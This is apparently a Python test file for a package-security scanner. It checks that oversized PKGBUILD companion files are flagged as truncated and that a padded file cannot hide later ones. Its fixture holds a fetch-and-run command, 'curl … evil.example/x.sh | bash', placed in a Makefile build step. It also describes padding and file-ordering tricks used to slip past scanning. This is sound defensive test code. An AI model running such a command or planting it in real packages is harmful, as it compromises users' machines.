"""A committed companion over the read budget is reported, not dropped."""

from .helpers import _repo_with

# ---------------------------------------------------------------------------
# Audit V1a/V1b - a committed companion over the budget was dropped in silence
#
# `companion_source_hunks` promised that a companion's "committed content is
# scanned with the same rules".  Past 64 KiB it stopped holding and nothing
# recorded that, so a payload in the tail of a large Makefile scored the same
# as a package with no companions.  Worse, the skip was a `break`: one padded
# benign file - and the attacker names both files, so they choose the sort
# order - ended the loop for every companion after it.
# ---------------------------------------------------------------------------


_MAKE_PAYLOAD = b"all:\n\tcurl -fsSL https://evil.example/x.sh | bash\n"
_COMPANION_PKGBUILD = (
    b"pkgname=p\npkgver=1\nsource=(Makefile)\n"
    b'build() {\n  make -f "$startdir/Makefile" all\n}\n'
)


def test_an_oversized_companion_reports_that_it_was_cut():
    """The payload may stay out of reach, but the silence may not."""
    from trustsight.differ import companion_source_hunks

    repo, commit = _repo_with([
        ("PKGBUILD", _COMPANION_PKGBUILD),
        ("Makefile", b"# pad\n" * 20000 + _MAKE_PAYLOAD),
    ])
    _text, truncated = companion_source_hunks(repo, commit)
    assert truncated, "a companion read only in part must say so"


def test_a_small_companion_reports_no_truncation():
    """The flag has to mean something: an ordinary companion may not set it."""
    from trustsight.differ import companion_source_hunks

    repo, commit = _repo_with([
        ("PKGBUILD", _COMPANION_PKGBUILD),
        ("Makefile", _MAKE_PAYLOAD),
    ])
    text, truncated = companion_source_hunks(repo, commit)
    assert not truncated
    assert "curl" in text


def test_the_head_of_an_oversized_companion_is_still_read():
    """It used to be dropped whole; now the budget's worth of it is read."""
    from trustsight.differ import companion_source_hunks

    repo, commit = _repo_with([
        ("PKGBUILD", _COMPANION_PKGBUILD),
        ("Makefile", _MAKE_PAYLOAD + b"# pad\n" * 20000),
    ])
    text, truncated = companion_source_hunks(repo, commit)
    assert "curl" in text, "a payload inside the budget must still be read"
    assert truncated


def test_a_padded_companion_cannot_starve_the_ones_after_it():
    """V1b: the attacker names both files, so they choose the sort order."""
    from trustsight.differ import companion_source_hunks

    pkgbuild = (
        b"pkgname=p\npkgver=1\nsource=(aaa-pad zz.mk)\n"
        b'build() {\n  cp "$startdir/aaa-pad" .\n'
        b'  make -f "$startdir/zz.mk" all\n}\n'
    )
    repo, commit = _repo_with([
        ("PKGBUILD", pkgbuild),
        ("aaa-pad", b"# benign\n" * 20000),
        ("zz.mk", _MAKE_PAYLOAD),
    ])
    text, truncated = companion_source_hunks(repo, commit)
    assert "curl" in text, "a later small companion must still be read"
    assert truncated, "and the padded one must be reported as cut"


def test_a_cut_companion_becomes_a_coverage_gap():
    from trustsight.coverage import COMPANION_TRUNCATED, gaps_from

    assert COMPANION_TRUNCATED in gaps_from(companion_truncated=True)
    assert COMPANION_TRUNCATED not in gaps_from(companion_truncated=False)
